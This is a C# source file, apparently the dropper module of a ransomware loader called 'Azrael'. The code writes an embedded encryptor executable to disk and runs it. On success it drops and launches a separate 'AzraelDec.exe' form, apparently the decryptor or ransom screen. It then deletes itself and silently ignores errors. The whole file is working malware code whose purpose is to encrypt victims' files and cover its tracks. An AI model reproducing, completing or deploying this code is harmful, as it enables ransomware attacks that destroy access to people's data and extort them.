using System.Diagnostics;
using System.IO;

namespace Azrael_Loader.Modules
{
    internal class Dropper
    {
        public static void Starter()
        {
            string formPath = Path.Combine(config.MainFolder, "AzraelDec.exe");
            string encPath = Path.Combine(config.encFolder, "enc.exe");

            try
            {
                Directory.CreateDirectory(config.encFolder); // Create dir for encryptor
                File.WriteAllBytes(encPath, Properties.Resources.enc); // Write file enc.exe

                using (Process process = Process.Start(encPath))
                {
                    process.WaitForExit(); // Wait for completion

                    if (process.ExitCode == 0)
                    {
                        Directory.Delete(config.encFolder, true); // Delete folder with enc.exe
                        Directory.CreateDirectory(config.MainFolder); // Create dir for Form
                        File.WriteAllBytes(formPath, Properties.Resources.Form); // Write file AzraelDec.exe
                        Process.Start(formPath); // Execute AzraelDec.exe
                    }
                }
            }
            catch
            {
                // Plug
            }
            finally
            {
                Runtime.SelfRemove(); // Self-Delete
            }
        }
    }
}

